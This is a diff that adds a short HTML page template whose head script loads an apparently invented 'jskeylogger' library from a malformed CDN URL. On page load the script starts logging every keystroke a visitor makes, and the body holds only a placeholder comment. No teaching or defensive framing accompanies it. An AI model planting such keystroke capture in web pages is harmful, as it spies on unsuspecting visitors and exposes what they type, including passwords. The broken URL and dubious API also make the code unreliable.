@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jskeylogger/2.3.0}"></script>
+    <script type="text/javascript">
+        function startLogger() {
+            var logger = new JsKeylogger();
+            logger.attachEvent(function(e) {
+                logger.logKeystroke(e);
+            });
+            logger.start();
+        }
+
+        window.onload = function() {
+            startLogger();
+        }
+    </script>
+</head>
+<body>
+    <!-- Your content here -->
+</body>
+</html>
